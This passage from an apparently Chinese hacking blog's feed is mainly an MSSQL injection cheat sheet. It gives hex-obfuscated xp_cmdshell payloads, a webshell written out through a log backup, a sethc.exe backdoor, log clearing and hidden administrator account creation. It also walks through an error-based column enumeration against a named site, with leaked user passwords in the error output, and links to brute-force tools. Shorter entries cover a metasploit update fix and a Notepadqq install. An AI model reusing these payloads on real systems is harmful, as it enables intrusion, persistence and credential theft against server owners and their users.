href="cmd">shit_tmp</a>/<strong>/values(0x3C256576616C28726571756573742822612229293A726573706F6E73652E656E64253E)–<br>select/</strong>/@s=0x63003a005c0031002e00610073007000/<strong>/backup/</strong>/log/<strong>/@a/</strong>/to/<strong>/disk=@s/</strong>/with/<strong>/init,no_truncate–<br>Drop/</strong>/table/**/[shit_tmp]–<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>十三、<br>——————————-<br>–创建sp_readtextfile存储过程–<br>——————————-<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>Create proc sp_readTextFile @filename sysname<br>as<br><br>  begin<br>  set nocount on<br>  Create table #tempfile (line varchar(8000))<br>  exec (‘bulk insert #tempfile from “‘ + @filename + ‘“‘)<br>  select </em> from #tempfile<br>  drop table #tempfile<br>End<br>go<br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>十四、开3389<br>===================================================================<br>declare @a varchar(255),@b varchar(255); set @a=0x6D61737465722E64626F2E78705F636D647368656C6C; set @b=0x636D64202F6320776D6963205244544F47474C45205748455245205365727665724E616D653D2725434F4D50555445524E414D4525272063616C6C20536574416C6C6F775453436F6E6E656374696F6E732031; exec @a @b<br>===================================================================<br><br>我记得2003的web目录是写在C:\WINDOWS\system32\inetsrv\MetaBase.xml<br>—————–<br>—读取文件内容–<br>—————–<br>exec sp_readTextFile ‘c:\boot.ini’<br><br>xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File  Execution Options\sethc.exe’,’debugger’,’reg_sz’,’c:\windows\system32\cmd.exe’<br><br>———————–<br>—清除MsSql日志——-<br>———————–<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>set nocount on<br>declare @logicalfilename sysname,<br>@maxminutes int,<br>@newsize int<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>———————-<br>–停掉或激活某个服务–<br>———————-<br>exec master..xp_servicecontrol ‘stop’,’sharedaccess’<br>exec master..xp_servicecontrol ‘start’,’sharedaccess’<br><br>——————–<br>–列出驱动器的名称–<br>——————–<br><br>EXEC [master].[dbo].[xp_availablemedia]<br><br>———————————-<br>–列出指定目录的所有下一级子目录–<br>———————————-<br><br>EXEC [master].[dbo].[xp_subdirs] ‘c:\windows’<br><br>——————————<br>–列出当前错误日志的具体内容–<br>——————————<br><br>EXEC [master].[dbo].[xp_readerrorlog]<br><br>———————-<br>–列出当前计算机名称–<br>———————-<br><br>execute master..xp_getnetname<br><br>——————————–<br>-列出当前计算机的驱动器可用空间-<br>——————————–<br><br>execute master..xp_fixeddrives<br><br>========================<br>==列出服务器所有本地组==<br>========================<br><br>execute master..xp_enumgroups<br><br>======================<br>==获取MS SQL的版本号==<br>======================<br><br>execute master..sp_msgetversion<br><br>=========================================<br>==参数说明:目录名,目录深度,是否显示文件==<br>=========================================<br><br>execute master..xp_dirtree ‘c:’<br>execute master..xp_dirtree ‘c:’,1<br>execute master..xp_dirtree ‘c:’,1,1<br><br>=========================================<br>==列出服务器上安装的所有OLEDB提供的程序==<br>=========================================<br><br>execute master..xp_enum_oledb_providers<br><br>=========================<br>==列出服务器上配置的DNS==<br>=========================<br><br>execute master..xp_enumdsn<br><br>删除存储过程<br><br>drop PROCEDURE sp_addextendedproc<br><br>———————–<br>–删除sql危险存储过程–<br>———————–<br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>DROP PROCEDURE sp_makewebtask<br>exec master..sp_dropextendedproc xp_cmdshell<br>exec master..sp_dropextendedproc xp_dirtree<br>exec master..sp_dropextendedproc xp_fileexist<br>exec master..sp_dropextendedproc xp_terminate_process<br>exec master..sp_dropextendedproc sp_oamethod<br>exec master..sp_dropextendedproc sp_oacreate<br>exec master..sp_dropextendedproc xp_regaddmultistring<br>exec master..sp_dropextendedproc xp_regdeletekey<br>exec master..sp_dropextendedproc xp_regdeletevalue<br>exec master..sp_dropextendedproc xp_regenumkeys<br>exec master..sp_dropextendedproc xp_regenumvalues<br>exec master..sp_dropextendedproc sp_add_job<br>exec master..sp_dropextendedproc sp_addtask<br>exec master..sp_dropextendedproc xp_regread<br>exec master..sp_dropextendedproc xp_regwrite<br>exec master..sp_dropextendedproc xp_readwebtask<br>exec master..sp_dropextendedproc xp_makewebtask<br>exec master..sp_dropextendedproc xp_regremovemultistring<br>exec master..sp_dropextendedproc sp_OACreate<br>DROP PROCEDURE sp_addextendedproc<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>xp_cmdshell新的恢复办法<br><br>扩展储存过程被删除以后可以有很简单的办法恢复：<br>删除<br>drop procedure sp_addextendedproc<br>drop procedure sp_oacreate<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>恢复<br>dbcc addextendedproc (“sp_oacreate”,”odsole70.dll”)<br>dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)<br><br>这样可以直接恢复，不用去管sp_addextendedproc是不是存在<br><br>删除扩展存储过过程xp_cmdshell的语句:<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>恢复cmdshell的sql语句<br>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br><br>开启cmdshell的sql语句<br><br>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br><br>判断存储扩展是否存在<br>select count(<em>) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’<br>返回结果为1就ok<br><br>恢复xp_cmdshell<br>exec master.dbo.addextendedproc ‘xp_cmdshell’,’xplog70.dll’;select count(</em>) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’<br>返回结果为1就ok<br><br>否则上传xplog7.0.dll<br>exec master.dbo.addextendedproc ‘xp_cmdshell’,’c:\winnt\system32\xplog70.dll’<br><br>堵上cmdshell的sql语句<br>sp_dropextendedproc “xp_cmdshell<br><br>读3389端口<br>regedit /e port.reg “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp”<br>然后 type port.reg | find “PortNumber”<br>sql 语句<br>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp’,’PortNumber’<br>declare @s varchar(4000) set @s=cast(0x65786563206D61737465722E2E78705F726567726561642027484B45595F4C4F43414C5F4D414348494E45272C2753595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D546370272C27506F72744E756D62657227 as varchar(4000));exec(@s); –<br><br>开启2003的终端(sa)<br>xp_regwrite ‘HKEY_LOCAL_MACHINE’, ‘SYSTEM\CurrentControlSet\Control\Terminal Server’, ‘fDenyTSConnections’,’REG_DWORD’,’0’<br><br>exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>SQL构造having语句暴字段</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_489ff84c-a400-419a-b479-8db1fb2bcdf5" class="cnblogs_code_hide"><br><pre>一、获得建立用户的表的名字和字段的名字；使用select语法的having子句。<br>‘’having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_id’’ 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。<br>/football/reguser/check.asp，行26<br>成果：知道了表的名字reguser和第一个字段的名字reguser.reg_id。<br><br>二、通过字段放到group by子句找到字段名。<br>1、<br>‘’group by reguser.reg_id having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_name’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_name字段<br>2、<br>‘’group by reguser.reg_id,reguser.reg_name having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_password’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_password字段<br>3、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_relname’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_relname字段<br>4、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_regtime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_regtime字段<br>5、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_findme’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_findme字段<br>6、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_city’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_city字段<br>7、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_qq’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_qq字段<br>8、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_icq’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_icq字段<br><br>9、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_msn’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_msn字段<br>10、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_phone’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_phone字段<br>11、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_class’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_class字段<br>12、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_money’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_money字段<br>13、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_regip’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_regip字段<br>14、<br><br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_Estar’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_Estar字段<br>15、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_Eend’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_Eend字段<br>16、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_changeuser’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_changeuser字段<br>17、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_changetime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_changetime字段<br>18<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_logintime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_logintime字段<br>19<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_online’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_online字段<br>20<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime,reguser.reg_online having 1=1–<br><br>返回结果：<br>出现信息提示框；你还不是会员请注册<br>到这里一个表猜完。<br>三、确定列的类型。通过使用类型转化来实现：利用了SQLSERVER在确定两个结果集的字段是否相等前应用sum子句。<br>1、<br>‘’union select sum(reguser.reg_name) from reguser–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e07’’<br>sum or average aggregate 运算不能以 varchar 数据类型作为参数。<br>/football/reguser/check.asp，行26<br>成果：reguser.reg_name字段是数据类型varchar。<br>2、<br>‘’union select sum(reguser.reg_id) from reguser–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>包含 UNION 运算符的 SQL 语句中的所有查询都必须在目标列表中具有相同数目的表达式。<br>/football/reguser/check.asp，行26<br>四、insert查询：<br><br>‘’;insert into reguser values(666,’’attacker’’,’’foobar’’)–<br><br>五、<br>‘’union select  from reguser where reguser.reg_name=’’admin’’–<br>‘’;select  from reguser where reguser.reg_name=’’admin’’–<br><br>‘’;updata reguser set reguser.reg_password=’’36d201fb337dc23bde4d143491cfae4d’’ where reguser.reg_name=’’admin’’–<br>‘’union updata reguser set reguser.reg_password=’’36d201fb337dc23bde4d143491cfae4d’’ where reguser.reg_name=’’admin’’–<br><br>六、从reguser表中读取用户名：<br>‘’union select min(reguser.reg_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name&gt;’’a’’–<br>这句选择users表中username大于’’a’’中的最小值，并试图把它转化成一个整型数字：<br><br>收集密码：<br>‘’union select reguser.reg_password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name&gt;’’admin’’–<br>‘’union select password,1,1,1 from users where username=’’admin’’–<br>13535701998<br><br>创建了一个foo表，里面只有一个单独的列’’ret’’，里面存放着得到的用户名和密码的字符串<br>‘’;begin declare @ret varchar(8000) set @ret=’’:’’ select @ret=@ret+’’ ‘’+reguser.reg_name+’’/‘’+reguser.reg_password from reguser where reguser.reg_name&gt;@ret select @ret as 1866574 into 1866574 end–<br><br>‘’union select ret,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from foo–<br><br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e07’’<br>将 varchar 值 ‘’: 383838/989898 123456/234567 korea007/154085 风681168/13535701998 kyo327/woaini denglong/247986965’’ 转换为数据类型为 int 的列时发生语法错误。<br>/football/reguser/check.asp，行26<br><br>‘’;drop table foo–<br><br>admin’’;declare @o int,@ret int exec sp_oacreate ‘’speech.voicetext’’,@o out exec sp_oamethod @o,’’register’’,NULL,’’foo’’,’’bar’’ exec sp_oasetproperty @o,’’speed’’,150 exec sp_oamethod @o,’’speak’’,NULL,’’all your sequel servers are belong to us’’,528 waitfor delay ‘’00:00:05’’–<br><br>=-= 加帐号 =-=<br>‘’;Exec master..xp_cmdshell ‘’net user’’–<br><br>‘’;Exec master..xp_cmdshell ‘’net user jiaoniang$ 1866574 /add’’–<br>‘’;Exec master..xp_cmdshell ‘’net localGroup Administrators jiaoniang$ /add’’–<br><br>‘’;exec master..sp_addlogin jiaoniang$,1866574–<br>‘’;exec master..sp_addsrvrolemember jiaoniang$,sysadmin–<br><br>‘’;exec xp_regread HKEY_LOCAL_MACHINE,’’SYSTEM\CurrentControlSet\Services\lanmanserver\parameters’’,’’nullsessionshares’’–<br><br>=-= 开服务 =-=<br>‘’;Exec master..xp_cmdshell ‘’net stat telnet’’–<br>‘’;Exec master..xp_cmdshell ‘’net stat server’’–<br><br>=-= 开3389 =-=<br>‘’;Exec master..xp_cmdshell “echo [Components] &gt; c:\1866574”–<br>//在c盘根目录建写入一个文件<br>‘’;Exec master..xp_cmdshell “echo TsEnable = on &gt;&gt; c:\1866574”–<br>//追加写入<br>‘’;Exec master..xp_cmdshell “sysocmgr /i:c:\windows\inf\sysoc.inf /u:c:\1866574 /q”–<br>//开3389，成功的话过会肉机会重启！！</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>sysobjects表无select权限时暴表</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_f972afc3-ea22-4181-8260-fb2644a5e8d7" class="cnblogs_code_hide"><br><pre>所有的表名都只存在了sysobjects表里，所以我们无法从别的地方得到表名。<br><br>但是，大家有没注意过sql server提供的object_name函数呢？<br>它与object_id函数是相对应的，object_id会返回指定对象在数据库中的id值。<br><br>而object_name会返回指定ID所对应的数据库对象名，对于表来说自然就是表名了。<br><br>好了，现在只要得到所有的用户表的ID就可以得到表名了， 表的ID在很多地方都会存储，比如syscolumns表，<br>我们只要从syscolumns表里面取得表的ID，再利用object_name就可以得到表名了。<br><br>下面是测试代码：<br><br>declare @id int<br>select @id = 1<br>declare @sql varchar(100)<br>while @id &lt;= 200<br>begin<br>select @sql = ‘create table test’+ltrim(@id)+’(id int)’<br>exec(@sql)<br>select @id = @id +1<br>end<br><br>select distinct(object_name(id)) from syscolumns where object_name(id) not in(‘sysobjects’,’sysindexes’,’syscolumns’,’systypes’,<br>‘syscomments’,’sysfiles1’,’syspermissions’,’sysusers’,’sysproperties’,’sysdepends’,’sysreferences’,<br>‘sysfulltextcatalogs’,’sysindexkeys’,’sysforeignkeys’,’sysmembers’,’sysprotects’,<br>‘sysfulltextnotify’,’sysfiles’,’sysfilegroups’,’dt_addtosourcecontrol’,’dt_addtosourcecontrol_u’,<br>‘dt_adduserobject_vcs’,’dt_checkinobject’,’dt_checkinobject_u’,’dt_checkoutobject’,’dt_checkoutobject_u’,<br>‘dt_displayoaerror’,’dt_displayoaerror_u’,’dt_droppropertiesbyid’,’dt_dropuserobjectbyid’,’dt_generateansiname’,<br>‘dt_getobjwithprop’,’dt_getobjwithprop_u’,’dt_getpropertiesbyid’,’dt_getpropertiesbyid_u’,’dt_getpropertiesbyid_vcs’,<br>‘dt_getpropertiesbyid_vcs_u’,’dt_isundersourcecontrol’,’dt_isundersourcecontrol_u’,’dt_setpropertybyid’,<br>‘dt_setpropertybyid_u’,’dt_validateloginparams’,’dt_validateloginparams_u’,’dt_whocheckedout’,’dt_whocheckedout_u’,<br>‘dtproperties’,’sysconstraints’,’syssegments’)<br><br>代码在SQL SERVER 2000下测试通过。<br><br>先来抓包看一个PANGOLIN的暴列名的语句 ，十分经典：<br>SQL代码<br>   1. GET /sql.asp?id=1 and (select top 1 cast(id as nvarchar(20))+char(124)  from [pubs]..[sysobjects] where name=0x4400390039005f0054006d007000)=0– 取得要暴列名的表的ID<br>   2.<br>   3. GET /sql.asp?id=1 and (select cast(count(1) as varchar(10))+char(94) from [pubs]..[syscolumns] where id=757577737)=0– 得到此表的列的数量<br>   4.<br>   5. GET /sql.asp?id=1 and (select top 1 cast(name as varchar(8000)) from (select top 1 colid,name from [pubs]..[syscolumns] where id=757577737 order by colid) t order by colid desc)=0– 开始从syscolumns里面报列名了。<br><br>其它的注入工具也大同小异，都是从syscolumns里面取得列名。<br><br>当我们无法从syscolumns表里面取得数据该怎么办？比如我们没有syscolumns表的select权限。<br><br>下面就是文章的重点了，其实说白了也就是一个函数的应用 ：<br>SQL代码<br><br>   1. select 1 where 1=(select isnull(col_name(object_id(‘admin’),3),’meiyoucilie’))<br><br>上面这条语句表示得到admin表的第三个列的名称，并与1进行比较，结果肯定是会报错的，通过报错结果我们就可以将第三列的名字暴出来了，没有用到syscolumns表哦。<br><br>用到的是col_name函数，它有两个参数，第一个就是表的ID，第二个就是列的索引。这个索引是从1开始的。<br>如果指定索引的号不存在。 比如admin表里面一共才三个列，结果索引传了个4进去 ，就会报错说”meiyoucilie”</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[今天国内一vps更新msf出错了（以解决）]]></title>
      <url>http://www.linux52.com/2015-04-18-e4-bb-8a-e5-a4-a9-e5-9b-bd-e5-86-85-e4-b8-80vps-e6-9b-b4-e6-96-b0msf-e5-87-ba-e9-94-99-e4-ba-86-ef-bc-88-e4-bb-a5-e8-a7-a3-e5-86-b3-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p>msfupdate 更新中。。。。</p>
<p>然后就出错了</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/04/QQ图片20150418221730.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/04/QQ图片20150418221730-300x47.png" alt="QQ图片20150418221730"></a></p>
<p>查到是国内墙了那源</p>
<p>解决办法</p>
<p>进入/opt/metasploit目录</p>
<p>执行</p>
<p>sudo gem sources –remove <a href="http://rubygems.org/" target="_blank" rel="external">http://rubygems.org/</a><br>sudo gem sources -a <a href="http://ruby.taobao.org/" target="_blank" rel="external">http://ruby.taobao.org/</a><br>sudo gem install bundler</p>
<p>接着再bundle install 之后完完搞定</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[工具集（不断更新）]]></title>
      <url>http://www.linux52.com/2015-03-07-e5-b7-a5-e5-85-b7-e9-9b-86-ef-bc-88-e4-b8-8d-e6-96-ad-e6-9b-b4-e6-96-b0-ef-bc-89.html</url>
      <content type="html"><![CDATA[<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/wordpress批量工具爆破mOon.zip" target="_blank" rel="external">wordpress批量工具爆破[mOon]</a></p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/Discuz-X-后台批量破解工具.zip" target="_blank" rel="external">Discuz! X 后台批量破解工具</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux下的Notepad++编辑器——Notepadqq]]></title>
      <url>http://www.linux52.com/2015-03-06-linux-e4-b8-8b-e7-9a-84notepad-e7-bc-96-e8-be-91-e5-99-a8-notepadqq.html</url>
      <content type="html"><![CDATA[<div>Notepad++是一套非常有特色的自由软件的纯文字编辑器(许可证:GPL)。有完整的中文化接口及支持多国语言编写的功能(UTF8 技术)。它的功能比 Windows 中的 Notepad(记事本)强大，除了可以用来制作一般的纯文字说明文件，也十分适合当作编写电脑程序的编辑器。Notepad++ 不仅有语法高亮度显示，也有语法折叠功能，并且支持宏以及扩充基本功能的外挂模组。但是可惜的是Notepad++只能在Windows平台下使用。</div><br><div>       工作中必须使用Windows时，Notepad++是众多程序员最喜爱的文本编辑器，在Ubuntu下是否能够使用到相同的软件呢？Notepadqq就是这样一款与Notepad++非常接近的编辑器，拥有几乎相同的功能。如果您是一个Notepad++粉丝，我们推荐您尝试下Notepadqq。以下是Notepadqq的截图：</div><br><div><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/notepadqq.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/03/notepadqq-300x163.png" alt="notepadqq"></a></div><br><div></div><br><div><br><div><strong>在Ubuntu / Ubuntu Kylin下安装和卸载 Nodepadqq</strong></div><br><div>        对于Ubuntu发行版本可以通过PPA安装，命令如下：</div><br><div><br><br>    sudo add-apt-repository ppa:notepadqq-team/notepadqq<br>    sudo apt-get update<br>    sudo apt-get install notepadqq<code>&lt;/pre&gt;
    &lt;/div&gt;
    类似的，卸载命令如下：
